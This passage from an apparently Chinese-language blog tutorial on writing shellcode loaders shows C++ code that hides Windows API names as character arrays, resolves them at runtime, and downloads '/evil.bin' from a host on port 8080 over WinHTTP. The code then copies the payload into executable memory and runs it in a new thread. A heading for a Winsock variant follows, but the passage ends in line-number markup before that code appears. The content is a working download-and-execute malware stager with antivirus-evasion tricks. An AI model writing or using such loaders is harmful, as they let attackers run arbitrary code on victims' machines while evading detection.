class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR winHttpCloseHandle[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR virtualAlloc[] = &#123; <span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR sleep[] = &#123; <span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR rtlMoveMemory[] = &#123; <span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR createThread[] = &#123; <span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR waitForSingleObject[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR closeHandle[] = &#123; <span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br>    CHAR loadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR getProcAddress[] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR kernel32[] = &#123; <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR winhttp[] = &#123; <span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR UA[] = &#123; <span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR IP[] = &#123; <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR PATH[] = &#123; <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR Method[] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR Version[] = &#123; <span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br>    <span class="hljs-comment">// 3.动态获取API函数</span><br>    MyGetProcAddress pGetProcAddress = (MyGetProcAddress)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, getProcAddress);<br>    MyLoadLibraryA pLoadLibraryA = (MyLoadLibraryA)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, loadLibraryA);<br>    MyVirtualAlloc pVirtualAlloc = (MyVirtualAlloc)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, virtualAlloc);<br>    MySleep pSleep = (MySleep)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, sleep);<br>    MyRtlMoveMemory pRtlMoveMemory = (MyRtlMoveMemory)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, rtlMoveMemory);<br>    MyCreateThread pCreateThread = (MyCreateThread)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, createThread);<br>    MyWaitForSingleObject pWaitForSingleObject = (MyWaitForSingleObject)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, waitForSingleObject);<br>    MyCloseHandle pCloseHandle = (MyCloseHandle)<span class="hljs-built_in">GetApiAddressByName</span>(kernel32, closeHandle);<br><br>    MyWinHttpOpen pWinHttpOpen = (MyWinHttpOpen)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(winhttp), winHttpOpen);<br>    MyWinHttpConnect pWinHttpConnect = (MyWinHttpConnect)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(winhttp), winHttpConnect);<br>    MyWinHttpOpenRequest pWinHttpOpenRequest = (MyWinHttpOpenRequest)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(winhttp), winHttpOpenRequest);<br>    MyWinHttpSendRequest pWinHttpSendRequest = (MyWinHttpSendRequest)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(winhttp), winHttpSendRequest);<br>    MyWinHttpReceiveResponse pWinHttpReceiveResponse = (MyWinHttpReceiveResponse)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(winhttp), winHttpReceiveResponse);<br>    MyWinHttpReadData pWinHttpReadData = (MyWinHttpReadData)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(winhttp), winHttpReadData);<br>    MyWinHttpCloseHandle pWinHttpCloseHandle = (MyWinHttpCloseHandle)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(winhttp), winHttpCloseHandle);<br><br>    <span class="hljs-comment">// 初始化WinHTTP会话</span><br>    HINTERNET hSession = <span class="hljs-built_in">pWinHttpOpen</span>(UA, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 1 = WINHTTP_ACCESS_TYPE_NO_PROXY</span><br><br>    <span class="hljs-comment">// 连接到HTTP服务器</span><br>    HINTERNET hConnect = <span class="hljs-built_in">pWinHttpConnect</span>(hSession, IP, <span class="hljs-number">8080</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 创建HTTP请求</span><br>    HINTERNET hRequest = <span class="hljs-built_in">pWinHttpOpenRequest</span>(hConnect, Method, PATH, Version, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 发送HTTP请求</span><br>    BOOL bResult = <span class="hljs-built_in">pWinHttpSendRequest</span>(hRequest, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 接收响应</span><br>    bResult = <span class="hljs-built_in">pWinHttpReceiveResponse</span>(hRequest, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 先分配一个较大的缓冲区来接收数据（支持更大的shellcode）</span><br>    <span class="hljs-type">const</span> DWORD MAX_SHELLCODE_SIZE = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 1MB 缓冲区</span><br>    LPVOID lpbuffer = <span class="hljs-built_in">pVirtualAlloc</span>(<span class="hljs-literal">NULL</span>, MAX_SHELLCODE_SIZE, MEM_COMMIT, PAGE_READWRITE);<br><br>    <span class="hljs-comment">// 读取数据</span><br>    DWORD dwTotalRead = <span class="hljs-number">0</span>;<br>    DWORD dwBytesRead = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 循环读取数据，直到读取完所有数据</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-built_in">pWinHttpReadData</span>(hRequest, (LPBYTE)lpbuffer + dwTotalRead, MAX_SHELLCODE_SIZE - dwTotalRead, &amp;dwBytesRead);<br>        dwTotalRead += dwBytesRead;<br>    &#125; <span class="hljs-keyword">while</span> (dwBytesRead &gt; <span class="hljs-number">0</span> &amp;&amp; dwTotalRead &lt; MAX_SHELLCODE_SIZE);<br><br>    <span class="hljs-comment">// 清理网络资源</span><br>    <span class="hljs-keyword">if</span> (hRequest) <span class="hljs-built_in">pWinHttpCloseHandle</span>(hRequest);<br>    <span class="hljs-keyword">if</span> (hConnect) <span class="hljs-built_in">pWinHttpCloseHandle</span>(hConnect);<br>    <span class="hljs-keyword">if</span> (hSession) <span class="hljs-built_in">pWinHttpCloseHandle</span>(hSession);<br><br>    <span class="hljs-comment">// 申请一块可执行的内存区域，大小为实际读取的数据大小</span><br>    LPVOID pExecutableMemory = <span class="hljs-built_in">pVirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwTotalRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-comment">// 将下载的数据复制到可执行内存区域</span><br>    <span class="hljs-built_in">pRtlMoveMemory</span>(pExecutableMemory, lpbuffer, dwTotalRead);<br><br>    <span class="hljs-comment">// 释放原始缓冲区</span><br>    <span class="hljs-built_in">pVirtualAlloc</span>(lpbuffer, <span class="hljs-number">0</span>, MEM_RELEASE, <span class="hljs-number">0</span>);<br><br><br>    <span class="hljs-comment">// 创建一个线程执行内存中的shellcode</span><br>    HANDLE hThread = <span class="hljs-built_in">pCreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pExecutableMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hThread) &#123;<br>        <span class="hljs-comment">// 等待线程执行完成</span><br>        <span class="hljs-built_in">pWaitForSingleObject</span>(hThread, INFINITE);<br>        <span class="hljs-comment">// 关闭线程句柄</span><br>        <span class="hljs-built_in">pCloseHandle</span>(hThread);<br>    &#125;<br><br>    <span class="hljs-comment">// 释放可执行内存</span><br>    <span class="hljs-built_in">pVirtualAlloc</span>(pExecutableMemory, <span class="hljs-number">0</span>, MEM_RELEASE, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760356651512-45108685-23c4-4d33-91c3-154375a861d0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="5-3-cpp-实现远程-shellcode（winsock）"><a href="#5-3-cpp-实现远程-shellcode（winsock）" class="headerlink" title="5.3 cpp 实现远程 shellcode（winsock）"></a>5.3 cpp 实现远程 shellcode（winsock）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span 